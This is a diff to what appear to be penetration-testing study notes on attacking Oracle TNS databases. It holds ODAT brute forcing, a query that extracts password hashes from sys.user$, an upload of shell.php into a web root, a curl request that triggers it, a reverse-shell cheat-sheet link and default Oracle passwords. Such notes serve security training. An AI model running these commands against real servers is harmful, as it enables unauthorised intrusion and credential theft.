@@ -1,14 +1,6 @@
+# Oracle Transparent Network Substrate
 ---
-tags:
-  - protocol
-  - system
-  - database
-  - footprint
-  - enumeration
-cssclasses:
-  - "[[Oracle TNS]]"
----
----
+
 # Footprint
 0. Odat tool && bruteforcing
 ```bash
@@ -38,12 +30,14 @@ select name, password from sys.user$;    # password extract
 | `C:\inetpub\wwwroot` | Windows |
 File uploading:
 ```bash
-./odat.py utlfile -s <ip> -d <..> -U <username> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt (for linux other path, check manual)
+./odat.py utlfile -s <ip> -d <..> -U <username> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./shell.php (for linux other path, check manual)
 ```
 
 ```bash
-curl -X GET http://10.129.204.235/testing.txt  # trigerring
+curl -X GET http://<ip>/shell.php  # trigerring
 ```
+https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python - Reverse Shell Cheat Sheet
+
 ## Interesting Features
 Oracle9 - default. password - `CHANGE_ON_INSTALL`
 Oracle10 - no default password
